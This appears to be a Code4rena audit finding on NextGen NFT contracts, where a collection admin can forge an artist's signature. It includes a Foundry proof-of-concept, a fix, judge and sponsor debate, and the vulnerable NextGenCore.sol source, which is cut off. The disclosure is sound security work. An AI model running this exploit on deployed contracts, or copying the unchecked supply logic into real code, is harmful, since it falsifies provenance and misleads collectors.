{
  "Title": "[M-06] Artist signatures can be forged to impersonate the artist behind a collection",
  "Content": "\nArtist signatures can be forged, making it possible to sign any message, while \"proving\" that it was signed by any address.\n\nThis can be done to impersonate any address from any artist, breaking a core protocol functionality, and losing users' trust. The signature can't be deleted by anyone, nor the artist address, once the collection is signed.\n\nThis also breaks one of the [main invariants of the protocol](https://github.com/code-423n4/2023-10-nextgen/tree/main#main-invariants):\n\n> Properties that should NEVER be broken under any circumstance:\n>\n> - Only artists can sign their collections.\n\nEvaluated as Medium since it breaks a core contract functionality, and a main invariant, regardless of trusted roles. As any collection admin can impersonate any legit address, which should be consider a way to \"escalate their authority beyond their role\" [as mentioned on the Access Control and Permissions Attack Ideas](https://github.com/code-423n4/2023-10-nextgen/tree/main#attack-ideas-where-to-look-for-bugs).\n\n### Proof of Concept\n\n`setCollectionData()` allows to set the artist address when the current `collectionTotalSupply == 0`:\n\n- [NextGenCore.sol#L149](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L149)\n- [NextGenCore.sol#L150](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L150)\n\nThe problem is that it doesn't check that the param `collectionTotalSupply` passed is `!= 0`. Meaning that the function can be executed multiple times to change the artist address, as long as the total supply is zero:\n\n- [NextGenCore.sol#L148](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L148)\n- [NextGenCore.sol#L153](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L153)\n\nSo, it can be called first to set a fake artist address to call `artistSignature()` to sign the collection:\n\n- [NextGenCore.sol#L257](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L257)\n\nAnd then call `setCollectionData()` again to set the legit artist address.\n\nOnce the signature is set, it can't be changed, nor the artist address, as it will always fall under the `else` clause:\n\n- [NextGenCore.sol#L162](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L162)\n- [NextGenCore.sol#L258](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L258)\n\nThe following coded POC shows how it can be done.\n\n### Coded Proof of Concept\n\n1. Run `forge init --no-git --force` to initiate Foundry on the root of the project.\n2. Create `test/Poc.t.sol` and copy the snippet below.\n3. Run `forge test`.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\n\nimport {NextGenAdmins} from \"smart-contracts/NextGenAdmins.sol\";\nimport {NextGenCore} from \"smart-contracts/NextGenCore.sol\";\n\n\ncontract AuctionTest is Test {\n    NextGenAdmins admin;\n    NextGenCore gencore;\n    address collectionAdmin;\n\n    function setUp() public {\n        admin = new NextGenAdmins();\n        gencore = new NextGenCore(\"core\", \"core\", address(admin));\n\n        string[] memory collectionScript = new string[](0);\n\n        gencore.createCollection(\n            \"Name\", \"Artist\", \"Description\", \"Website\", \"License\", \"https://base-uri.com/\" \"Library\", \"Script\", new string[](0)\n        );\n\n        uint256 collectionId = 1;\n        collectionAdmin = makeAddr(\"collectionAdmin\");\n        admin.registerCollectionAdmin(collectionId, collectionAdmin, true);\n    }\n\n    function testArtistSignature() public {\n        uint256 collectionId = 1;\n        address fakeArtist = collectionAdmin;\n        uint256 maxCollectionPurchases = 10;\n        uint256 zeroSupply = 0; // Supply = 0 allows this attack\n        uint256 setFinalSupplyTimeAfterMint = block.timestamp + 30 days;\n\n        // The collection admin sets the initial collection data with a fake artist\n        vm.prank(collectionAdmin);\n        gencore.setCollectionData(\n            collectionId,\n            fakeArtist,\n            maxCollectionPurchases,\n            zeroSupply,\n            setFinalSupplyTimeAfterMint\n        );\n\n        // Then uses the fake artist address to sign a message impersonating a legit artist\n        string memory fakeSignature = \"I am the Legit Artist Behind CryptoPunks. This is my signature.\";\n        vm.prank(fakeArtist);\n        gencore.artistSignature(collectionId, fakeSignature);\n\n        address legitArtist = makeAddr(\"legitArtist\");\n        uint256 realTotalSupply = 1000;\n\n        // Finally sets the \"initial\" collection data again, but with the legit artist address and the real total supply\n        vm.prank(collectionAdmin);\n        gencore.setCollectionData(\n            collectionId,\n            legitArtist,\n            maxCollectionPurchases,\n            realTotalSupply,\n            setFinalSupplyTimeAfterMint\n        );\n\n        // The result is a collection impersonating a legit address, with a fake signature as a proof\n        assertEq(gencore.retrieveArtistAddress(collectionId), legitArtist);\n        assertEq(gencore.artistsSignatures(collectionId), fakeSignature);\n    }\n}\n```\n\n### Recommended Mitigation Steps\n\nOne way to prevent this is by checking that the collection total supply is set to a value `> 0`:\n\n```diff\n    function setCollectionData(\n        uint256 _collectionID,\n        address _collectionArtistAddress,\n        uint256 _maxCollectionPurchases,\n        uint256 _collectionTotalSupply,\n        uint _setFinalSupplyTimeAfterMint\n    ) public CollectionAdminRequired(_collectionID, this.setCollectionData.selector) {\n        require(\n            (isCollectionCreated[_collectionID] == true) && \n            (collectionFreeze[_collectionID] == false) && \n+           (_collectionTotalSupply > 0)\n            (_collectionTotalSupply <= 10000000000\n        ), \"err/freezed\");\n```\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/741#issuecomment-1843091896):**\n > The Warden specifies a potential attack path in the artist configuration of a collection by weaponizing the absence of an input sanitization for the `_collectionTotalSupply` argument.\n> \n> Specifically, they envision the following scenario:\n> - A collection is initialized with an artist **but a zero `_collectionTotalSupply` value**.\n> - An artist signs the collection (this is permitted by `artistSignature`).\n> - A collection is re-initialized as the `if` structure enters the first conditional, this time with a non-zero collection supply and a different artist.\n> \n> At this point, the collection will have a different artist than the one that signed the collection which breaks an invariant of the protocol and is incorrect behavior.\n> \n> The Sponsor disputes this submission, but I invite them to re-consider the above step-by-step scenario which is presently possible in the codebase.\n> \n> I believe that a medium-risk rating for this is correct, as the artist associated with a collection is crucial to the collection's value, and a collection will appear \"signed\" even if the artist did not sign it.\n> \n> The Warden's submission was selected as the best due to pinpointing the exact problem in the codebase, outlining a step-by-step scenario via which it can be exploited, and assigning it an apt risk rating.\n\n**[a2rocket (NextGen) disputed and commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/741#issuecomment-1844559910):**\n > NextGen admins are responsible for setting up a collection. The steps are [here](https://seize-io.gitbook.io/nextgen/nextgen-smart-contracts/getting-started).\n> \n> No one can sign a collection besides the address that was set during step 2, so the statement that anyone can impersonate artist is totally wrong!\n> \n> The collection is deemed finalized when a `totalSupply` is set! Once a `totalsupply` is set and the artist did not sign, the address of the artist can change. Once the artist signs the collection the signature cannot change. This is the process. \n\n**[MrPotatoMagic (warden) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/741#issuecomment-1848593029):**\n > @0xsomeone, this issue should be marked QA at most or even invalid imo. Here is why:\n> \n> 1. In the follow-up feedback from the sponsor above, @a2rocket clearly mentions NextGen admins are responsible for setting up a collection. This means not anyone can just create a collection and launch this attack since it requires the NextGen team's trust in a set of people.\n> 2. Even after the filtering process by the NextGen team, the signature can never be forged because on the blockchain you can clearly see who signed the transaction i.e. the call to [artistSignature()](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L258), which can only be made by the current address set for the collection.\n> 3. Forgery of signature would only make sense for legal purposes and the proof of who signed [artistSignature()](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L258) is present on the Ethereum blockchain.\n> 4. If a collection turns out to be malicious, the NextGen team can just warn users and remove that specific collection from their frontend.\n> \n> Due to all of these reasons, this issue should be QA or invalid.\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/741#issuecomment-1848645283):**\n > @MrPotatoMagic, thanks for providing feedback on this! The submission has been graded as medium in severity due to breaking a core invariant of the protocol, which is that when an artist is associated with a particular collection and has signed it it cannot be altered.\n> \n> 1. The response by the Sponsor concerning NextGen administrators **is invalid**. You can evaluate the code yourself and see **that the collection administrator can independently perform these actions with no input from the administrative team of NextGen**.\n> \n> 2. The signature is forced because there is no obligation to provide any form of data in the `artistSignature` call. Yes, anyone can go on-chain and see when the `artistSignature` was invoked using off-chain tracking tools but that does not correspond to the on-chain data reality. The on-chain data says that the collection has been signed by an artist who never did so, and this is an irreversible change **even by administrators**.\n> 3. See #2 above.\n> 4. This is invalid reasoning as the same principle could apply to a wide variety of submissions in this context. \n> \n> **Conclusion** - A core invariant of the protocol has been demonstrated to be possible to break **with no input by the NextGen administrators whatsoever**. Additionally, **this invariant is irreversibly broken** and cannot be rescued even by administrative action.\n> \n> As such, I retain my judgment on this submission as being of medium-risk severity.\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-nextgen-findings/issues/741).*\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-10-nextgen",
  "Code": [
    {
      "filename": "smart-contracts/NextGenCore.sol",
      "content": "// SPDX-License-Identifier: MIT\n\n/**\n *\n *  @title: NextGen Smart Contract\n *  @date: 19-October-2023 \n *  @version: 10.28\n *  @author: 6529 team\n */\n\npragma solidity ^0.8.19;\n\nimport \"./ERC721Enumerable.sol\";\nimport \"./Ownable.sol\";\nimport \"./Strings.sol\";\nimport \"./Base64.sol\";\nimport \"./IRandomizer.sol\";\nimport \"./INextGenAdmins.sol\";\nimport \"./IMinterContract.sol\";\nimport \"./ERC2981.sol\";\n\ncontract NextGenCore is ERC721Enumerable, Ownable, ERC2981 {\n    using Strings for uint256;\n\n    // declare variables\n    uint256 public newCollectionIndex;\n\n    // collectionInfo struct declaration\n    struct collectionInfoStructure {\n        string collectionName;\n        string collectionArtist;\n        string collectionDescription;\n        string collectionWebsite;\n        string collectionLicense;\n        string collectionBaseURI;\n        string collectionLibrary;\n        string[] collectionScript;\n    }\n\n    // mapping of collectionInfo struct\n    mapping (uint256 => collectionInfoStructure) private collectionInfo;\n\n    // collectionAdditionalData struct declaration\n    struct collectionAdditonalDataStructure {\n        address collectionArtistAddress;\n        uint256 maxCollectionPurchases;\n        uint256 collectionCirculationSupply;\n        uint256 collectionTotalSupply;\n        uint256 reservedMinTokensIndex;\n        uint256 reservedMaxTokensIndex;\n        uint setFinalSupplyTimeAfterMint;\n        address randomizerContract;\n        IRandomizer randomizer;\n    }\n\n    // mapping of collectionAdditionalData struct\n    mapping (uint256 => collectionAdditonalDataStructure) private collectionAdditionalData;\n\n    // other mappings\n\n    // checks if a collection was created\n    mapping (uint256 => bool) private isCollectionCreated; \n\n    // checks if data on a collection were added\n    mapping (uint256 => bool) private wereDataAdded;\n\n    // maps tokends ids with collectionsids\n    mapping (uint256 => uint256) private tokenIdsToCollectionIds;\n\n    // stores randomizer hash\n    mapping(uint256 => bytes32) private tokenToHash;\n\n    // minted tokens per address per collection during public sale\n    mapping (uint256 => mapping (address => uint256)) private tokensMintedPerAddress;\n\n    // minted tokens per address per collection during allowlist\n    mapping (uint256 => mapping (address => uint256)) private tokensMintedAllowlistAddress;\n\n    // tokens airdrop per address per collection \n    mapping (uint256 => mapping (address => uint256)) private tokensAirdropPerAddress;\n\n    // current amount of burnt tokens per collection\n    mapping (uint256 => uint256) public burnAmount;\n\n    // modify the metadata view\n    mapping (uint256 => bool) public onchainMetadata; \n\n    // artist signature per collection\n    mapping (uint256 => string) public artistsSignatures;\n\n    // tokens additional metadata\n    mapping (uint256 => string) public tokenData;\n\n    // on-chain token Image URI and attributes\n    mapping (uint256 => string[2]) private tokenImageAndAttributes;\n\n    // collectionFreeze \n    mapping (uint256 => bool) private collectionFreeze;\n\n    // artist signed\n    mapping (uint256 => bool) public artistSigned; \n\n    // external contracts declaration\n    INextGenAdmins private adminsContract;\n    address public minterContract;\n\n    // smart contract constructor\n    constructor(string memory name, string memory symbol, address _adminsContract) ERC721(name, symbol) {\n        adminsContract = INextGenAdmins(_adminsContract);\n        newCollectionIndex = newCollectionIndex + 1;\n        _setDefaultRoyalty(0x1B1289E34Fe05019511d7b436a5138F361904df0, 690);\n    }\n\n    // certain functions can only be called by a global or function admin\n\n    modifier FunctionAdminRequired(bytes4 _selector) {\n      require(adminsContract.retrieveFunctionAdmin(msg.sender, _selector) == true || adminsContract.retrieveGlobalAdmin(msg.sender) == true , \"Not allowed\");\n      _;\n    }\n\n    // certain functions can only be called by a collection, global or function admin\n\n    modifier CollectionAdminRequired(uint256 _collectionID, bytes4 _selector) {\n      require(adminsContract.retrieveCollectionAdmin(msg.sender,_collectionID) == true || adminsContract.retrieveFunctionAdmin(msg.sender, _selector) == true || adminsContract.retrieveGlobalAdmin(msg.sender) == true, \"Not allowed\");\n      _;\n    }\n\n    // function to create a Collection\n\n    function createCollection(string memory _collectionName, string memory _collectionArtist, string memory _collectionDescription, string memory _collectionWebsite, string memory _collectionLicense, string memory _collectionBaseURI, string memory _collectionLibrary, string[] memory _collectionScript) public FunctionAdminRequired(this.createCollection.selector) {\n        collectionInfo[newCollectionIndex].collectionName = _collectionName;\n        collectionInfo[newCollectionIndex].collectionArtist = _collectionArtist;\n        collectionInfo[newCollectionIndex].collectionDescription = _collectionDescription;\n        collectionInfo[newCollectionIndex].collectionWebsite = _collectionWebsite;\n        collectionInfo[newCollectionIndex].collectionLicense = _collectionLicense;\n        collectionInfo[newCollectionIndex].collectionBaseURI = _collectionBaseURI;\n        collectionInfo[newCollectionIndex].collectionLibrary = _collectionLibrary;\n        collectionInfo[newCollectionIndex].collectionScript = _collectionScript;\n        isCollectionCreated[newCollectionIndex] = true;\n        newCollectionIndex = newCollectionIndex + 1;\n    }\n\n    // function to add/modify the additional data of a collection\n    // once a collection is created and total supply is set it cannot be changed\n    // only _collectionArtistAddress , _maxCollectionPurchases can change after total supply is set\n\n    function setCollectionData(uint256 _collectionID, address _collectionArtistAddress, uint256 _maxCollectionPurchases, uint256 _collectionTotalSupply, uint _setFinalSupplyTimeAfterMint) public CollectionAdminRequired(_collectionID, this.setCollectionData.selector) {\n        require((isCollectionCreated[_collectionID] == true) && (collectionFreeze[_collectionID] == false) && (_collectionTotalSupply <= 10000000000), \"err/freezed\");\n        if (collectionAdditionalData[_collectionID].collectionTotalSupply == 0) {\n            collectionAdditionalData[_collectionID].collectionArtistAddress = _collectionArtistAddress;\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].collectionCirculationSupply = 0;\n            collectionAdditionalData[_collectionID].collectionTotalSupply = _collectionTotalSupply;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;\n            collectionAdditionalData[_collectionID].reservedMinTokensIndex = (_collectionID * 10000000000);\n            collectionAdditionalData[_collectionID].reservedMaxTokensIndex = (_collectionID * 10000000000) + _collectionTotalSupply - 1;\n            wereDataAdded[_collectionID] = true;\n        } else if (artistSigned[_collectionID] == false) {\n            collectionAdditionalData[_collectionID].collectionArtistAddress = _collectionArtistAddress;\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;\n        } else {\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;\n        }\n    }\n\n    // Add Randomizer contract on collection\n\n    function addRandomizer(uint256 _collectionID, address _randomizerContract) public FunctionAdminRequired(this.addRandomizer.selector) {\n        require(IRandomizer(_randomizerContract).isRandomizerContract() == true, \"Contract is not Randomizer\");\n        collectionAdditionalData[_collectionID].randomizerContract = _randomizerContract;\n        collectionAdditionalData[_collectionID].randomizer = IRandomizer(_randomizerContract);\n    }\n\n    // airdrop called from minterContract\n    \n    function airDropTokens(uint256 mintIndex, address _recipient, string memory _tokenData, uint256 _saltfun_o, uint256 _collectionID) external {\n        require(msg.sender == minterContract, \"Caller is not the Minter Contract\");\n        collectionAdditionalData[_collectionID].collectionCirculationSupply = collectionAdditionalData[_collectionID].collectionCirculationSupply + 1;\n        if (collectionAdditionalData[_collectionID].collectionTotalSupply >= collectionAdditionalData[_collectionID].collectionCirculationSupply) {\n            _mintProcessing(mintIndex, _recipient, _tokenData, _collectionID, _saltfun_o);\n            tokensAirdropPerAddress[_collectionID][_recipient] = tokensAirdropPerAddress[_collectionID][_recipient] + 1;\n        }\n    }\n\n    // mint called from minterContract\n\n    function mint(uint256 mintIndex, address _mintingAddress , address _mintTo, string memory _tokenData, uint256 _saltfun_o, uint256 _collectionID, uint256 phase) external {\n        require(msg.sender == minterContract, \"Caller is not the Minter Contract\");\n        collectionAdditionalData[_collectionID].collectionCirculationSupply = collectionAdditionalData[_collectionID].collectionCirculationSupply + 1;\n        if (collectionAdditionalData[_collectionID].collectionTotalSupply >= collectionAdditionalData[_collectionID].collectionCirculationSupply) {\n            _mintProcessing(mintIndex, _mintTo, _tokenData, _collectionID, _saltfun_o);\n            if (phase == 1) {\n                tokensMintedAllowlistAddress[_collectionID][_mintingAddress] = tokensMintedAllowlistAddress[_collectionID][_mintingAddress] + 1;\n            } else {\n                tokensMintedPerAddress[_collectionID][_mintingAddress] = tokensMintedPerAddress[_collectionID][_mintingAddress] + 1;\n            }\n        }\n    }\n\n    // burn function\n\n    function burn(uint256 _collectionID, uint256 _tokenId) public {\n        require(_isApprovedOrOwner(_msgSender(), _tokenId), \"ERC721: caller is not token owner or approved\");\n        require ((_tokenId >= collectionAdditionalData[_collectionID].reservedMinTokensIndex) && (_tokenId <= collectionAdditionalData[_collectionID].reservedMaxTokensIndex), \"id err\");\n        _burn(_tokenId);\n        burnAmount[_collectionID] = burnAmount[_collectionID] + 1;\n    }\n\n    // burn to mint called from minterContract\n\n    function burnToMint(uint256 mintIndex, uint256 _burnCollectionID, uint256 _tokenId, uint256 _mintCollectionID, uint256 _saltfun_o, address burner) external {\n        require(msg.sender == minterContract, \"Caller is not the Minter Contract\");\n        require(_isApprovedOrOwner(burner, _tokenId), \"ERC721: caller is not token owner or approved\");\n        collectionAdditionalData[_mintCollectionID].collectionCirculationSupply = collectionAdditionalData[_mintCollectionID].collectionCirculationSupply + 1;\n        if (collectionAdditionalData[_mintCollectionID].collectionTotalSupply >= collectionAdditionalData[_mintCollectionID].collectionCirculationSupply) {\n            _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);\n            // burn token\n            _burn(_tokenId);\n            burnAmount[_burnCollectionID] = burnAmount[_burnCollectionID] + 1;\n        }\n    }\n\n    // mint processing\n\n    function _mintProcessing(uint256 _mintIndex, address _recipient, string memory _tokenData, uint256 _collectionID, uint256 _saltfun_o) internal {\n        tokenData[_mintIndex] = _tokenData;\n        collectionAdditionalData[_collectionID].randomizer.calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);\n        tokenIdsToCollectionIds[_mintIndex] = _collectionID;\n        _safeMint(_recipient, _mintIndex);\n    }\n\n    // Additional setter functions\n\n    // function to update Collection Info\n\n    function updateCollectionInfo(uint256 _collectionID, string memory _newCollectionName, string memory _newCollectionArtist, string memory _newCollectionDescription, string memory _newCollectionWebsite, string memory _newCollectionLicense, string memory _newCollectionBaseURI, string memory _newCollectionLibrary, uint256 _index, string[] memory _newCollectionScript) public CollectionAdminRequired(_collectionID, this.updateCollectionInfo.selector) {\n        require((isCollectionCreated[_collectionID] == true) && (collectionFreeze[_collectionID] == false), \"Not allowed\");\n         if (_index == 1000) {\n            collectionInfo[_collectionID].collectionName = _newCollectionName;\n            collectionInfo[_collectionID].collectionArtist = _newCollectionArtist;\n            collectionInfo[_collectionID].collectionDescription = _newCollectionDescription;\n            collectionInfo[_collectionID].collectionWebsite = _newCollectionWebsite;\n            collectionInfo[_collectionID].collectionLicense = _newCollectionLicense;\n            collectionInfo[_collectionID].collectionLibrary = _newCollectionLibrary;\n            collectionInfo[_collectionID].collectionScript = _newCollectionScript;\n        } else if (_index == 999) {\n            collectionInfo[_collectionID].collectionBaseURI = _newCollectionBaseURI;\n        } else {\n            collectionInfo[_collectionID].collectionScript[_index] = _newCollectionScript[0];\n        }\n    }\n\n    // function for artist signature\n\n    function artistSignature(uint256 _collectionID, string memory _signature) public {\n        require(msg.sender == collectionAdditionalData[_collectionID].collectionArtistAddress, \"Only artist\");\n        require(artistSigned[_collectionID] == false, \"Already Signed\");\n        artistsSignatures[_collectionID] = _signature;\n        artistSigned[_collectionID] = true;\n    }\n\n    // function change metadata view \n\n    function changeMetadataView(uint256 _collectionID, bool _status) public CollectionAdminRequired(_collectionID, this.changeMetadataView.selector) { \n        require((isCollectionCreated[_collectionID] == true) && (collectionFreeze[_collectionID] == false), \"Not allowed\");\n        onchainMetadata[_collectionID] = _status;\n    }\n\n    // function to change the token data\n\n    function changeTokenData(uint256 _tokenId, string memory newData) public FunctionAdminRequired(this.changeTokenData.selector) {\n        require(collectionFreeze[tokenIdsToCollectionIds[_tokenId]] == false, \"Data frozen\");\n        _requireMinted(_tokenId);\n        tokenData[_tokenId] = newData;\n    }\n\n    // function to add a thumbnail image\n\n    function updateImagesAndAttributes(uint256[] memory _tokenId, string[] memory _images, string[] memory _attributes) public FunctionAdminRequired(this.updateImagesAndAttributes.selector) {\n        for (uint256 x; x < _tokenId.length; x++) {\n            require(collectionFreeze[tokenIdsToCollectionIds[_tokenId[x]]] == false, \"Data frozen\");\n            _requireMinted(_tokenId[x]);\n            tokenImageAndAttributes[_tokenId[x]][0] = _images[x];\n            tokenImageAndAttributes[_tokenId[x]][1] = _attributes[x];\n        }\n    }\n\n    // freeze collection\n\n    function freezeCollection(uint256 _collectionID) public FunctionAdminRequired(this.freezeCollection.selector) {\n        require(isCollectionCreated[_collectionID] == true, \"No Col\");\n        collectionFreeze[_collectionID] = true;\n    }\n\n    // set tokenHash\n\n    function setTokenHash(uint256 _collectionID, uint256 _mintIndex, bytes32 _hash) external {\n        require(msg.sender == collectionAdditionalData[_collectionID].randomizerContract);\n        require(tokenToHash[_mintIndex] == 0x0000000000000000000000000000000000000000000000000000000000000000);\n        tokenToHash[_mintIndex] = _hash;\n    }\n\n    // set final supply\n\n    function setFinalSupply(uint256 _collectionID) public FunctionAdminRequired(this.setFinalSupply.selector) {\n        require (block.timestamp > IMinterContract(minterContract).getEndTime(_collectionID) + collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint, \"Time has not passed\");\n        collectionAdditionalData[_collectionID].collectionTotalSupply = collectionAdditionalData[_collectionID].collectionCirculationSupply;\n        collectionAdditionalData[_collectionID].reservedMaxTokensIndex = (_collectionID * 10000000000) + collectionAdditionalData[_collectionID].collectionTotalSupply - 1;\n    }\n\n    // function to add a minter contract\n\n    function addMinterContract(address _minterContract) public FunctionAdminRequired(this.addMinterContract.selector) { \n        require(IMinterContract(_minterContract).isMinterContract() == true, \"Contract is not Minter\");\n        minterContract = _minterContract;\n    }\n\n    // function to update admin contract\n\n    function updateAdminContract(address _newadminsContract) public FunctionAdminRequired(this.updateAdminContract.selector) {\n        require(INextGenAdmins(_newadminsContract).isAdminContract() == true, \"Contract is not Admin\");\n        adminsContract = INextGenAdmins(_newadminsContract);\n    }\n\n    // function to update default royalties\n    \n    function setDefaultRoyalties(address _royaltyAddress, uint96 _bps) public FunctionAdminRequired(this.setDefaultRoyalties.selector) {\n        _setDefaultRoyalty(_royaltyAddress, _bps);\n    }\n\n    // Retrieve Functions\n\n    // function to override supportInterface\n\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC721Enumerable, ERC2981) returns (bool) { \n        return super.supportsInterface(interfaceId); \n    }\n\n    // function to return the tokenURI\n\n    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\n        _requireMinted(tokenId);\n        if (onchainMetadata[tokenIdsToCollectionIds[tokenId]] == false && tokenToHash[tokenId] != 0x0000000000000000000000000000000000000000000000000000000000000000) {\n            string memory baseURI = collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionBaseURI;\n            return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \"\";\n        } else if (onchainMetadata[tokenIdsToCollectionIds[tokenId]] == false && tokenToHash[tokenId] == 0x0000000000000000000000000000000000000000000000000000000000000000) {\n            string memory baseURI = collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionBaseURI;\n            return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, \"pending\")) : \"\";\n        }\n        else {\n            string memory b64 = Base64.encode(abi.encodePacked(\"<html><head></head><body><script src=\\\"\",collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionLibrary,\"\\\"></script><script>\",retrieveGenerativeScript(tokenId),\"</script></body></html>\"));\n            string memory _uri = string(abi.encodePacked(\"data:application/json;utf8,{\\\"name\\\":\\\"\",getTokenName(tokenId),\"\\\",\\\"description\\\":\\\"\",collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionDescription,\"\\\",\\\"image\\\":\\\"\",tokenImageAndAttributes[tokenId][0],\"\\\",\\\"attributes\\\":[\",tokenImageAndAttributes[tokenId][1],\"],\\\"animation_url\\\":\\\"data:text/html;base64,\",b64,\"\\\"}\"));\n            return _uri;\n        }\n    }\n\n    // function get Name\n\n    function getTokenName(uint256 tokenId) private view returns(string memory)  {\n        uint256 tok = tokenId - collectionAdditionalData[tokenIdsToCollectionIds[tokenId]].reservedMinTokensIndex;\n        return string(abi.encodePacked(collectionInfo[viewColIDforTokenID(tokenId)].collectionName, \" #\" ,tok.toString()));\n    }\n\n    // retrieve the collection freeze status\n    function collectionFreezeStatus(uint256 _collectionID) public view returns(bool){\n        return collectionFreeze[_collectionID];\n    }\n\n    // function to return the collection id given a token id\n    function viewColIDforTokenID(uint256 _tokenid) public view returns (uint256) {\n        return(tokenIdsToCollectionIds[_tokenid]);\n    }\n\n    // retrieve if data were added\n    function retrievewereDataAdded(uint256 _collectionID) external view returns(bool){\n        return wereDataAdded[_collectionID];\n    }\n\n    // function to return the min index id of a collection\n\n    function viewTokensIndexMin(uint256 _collectionID) external view returns (uint256) {\n        return(collectionAdditionalData[_collectionID].reservedMinTokensIndex);\n    }\n\n    // function to return the max index id of a collection\n\n    function viewTokensIndexMax(uint256 _collectionID) external view returns (uint256) {\n        return(collectionAdditionalData[_collectionID].reservedMaxTokensIndex);\n    }\n\n    // function to return the circ supply of a collection\n    function viewCirSupply(uint256 _collectionID) external view returns (uint256) {\n        return(collectionAdditionalData[_collectionID].collectionCirculationSupply);\n    }\n\n    // function to return max allowance in public sale\n    function viewMaxAllowance(uint256 _collectionID) external view returns (uint256) {\n        return(collectionAdditionalData[_collectionID].maxCollectionPurchases);\n    }\n\n    // function to return tokens minted per address during AL\n    function retrieveTokensMintedALPerAddress(uint256 _collectionID, address _address) external view returns(uint256) {\n        return (tokensMintedAllowlistAddress[_collectionID][_address]);\n    }\n\n    // function to return tokens minted per address during Public\n    function retrieveTokensMintedPublicPerAddress(uint256 _collectionID, address _address) external view returns(uint256) {\n        return (tokensMintedPerAddress[_collectionID][_address]);\n    }\n\n    // function to retrieve the airdrop/minted tokens per address \n\n    function retrieveTokensAirdroppedPerAddress(uint256 _collectionID, address _address) public view returns(uint256) {\n        return (tokensAirdropPerAddress[_collectionID][_address]);\n    }\n\n    // function to return the artist's address\n    function retrieveArtistAddress(uint256 _collectionID) external view returns(address) {\n        return (collectionAdditionalData[_collectionID].collectionArtistAddress);\n    }\n\n    // function to retrieve a Collection's Info\n\n    function retrieveCollectionInfo(uint256 _collectionID) public view returns(string memory, string memory, string memory, string memory, string memory, string memory){\n        return (collectionInfo[_collectionID].collectionName, collectionInfo[_collectionID].collectionArtist, collectionInfo[_collectionID].collectionDescription, collectionInfo[_collectionID].collectionWebsite, collectionInfo[_collectionID].collectionLicense, collectionInfo[_collectionID].collectionBaseURI);\n    }\n\n    // function to retrieve the library and script of a collection\n\n    function retrieveCollectionLibraryAndScript(uint256 _collectionID) public view returns(string memory, string[] memory){\n        return (collectionInfo[_collectionID].collectionLibrary, collectionInfo[_collectionID].collectionScript);\n    }\n\n    // function to retrieve the Additional data of a Collection\n\n    function retrieveCollectionAdditionalData(uint256 _collectionID) public view returns(address, uint256, uint256, uint256, uint, address){\n        return (collectionAdditionalData[_collectionID].collectionArtistAddress, collectionAdditionalData[_collectionID].maxCollectionPurchases, collectionAdditionalData[_collectionID].collectionCirculationSupply, collectionAdditionalData[_collectionID].collectionTotalSupply, collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint, collectionAdditionalData[_collectionID].randomizerContract);\n    }\n\n    // function to retrieve tokenHash\n\n    function retrieveTokenHash(uint256 _tokenid) public view returns(bytes32){\n        return (tokenToHash[_tokenid]);\n    }\n\n    // function to retrieve the Generative Script of a token\n\n    function retrieveGenerativeScript(uint256 tokenId) public view returns(string memory){\n        _requireMinted(tokenId);\n        string memory scripttext;\n        for (uint256 i=0; i < collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionScript.length; i++) {\n            scripttext = string(abi.encodePacked(scripttext, collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionScript[i])); \n        }\n        return string(abi.encodePacked(\"let hash='\",Strings.toHexString(uint256(tokenToHash[tokenId]), 32),\"';let tokenId=\",tokenId.toString(),\";let tokenData=[\",tokenData[tokenId],\"];\", scripttext));\n    }\n\n    // function to retrieve the supply of a collection\n\n    function totalSupplyOfCollection(uint256 _collectionID) public view returns (uint256) {\n        return (collectionAdditionalData[_collectionID].collectionCirculationSupply - burnAmount[_collectionID]);\n    }\n\n    // function to retrieve the token image uri and the attributes stored on-chain for a token id.\n\n    function retrievetokenImageAndAttributes(uint256 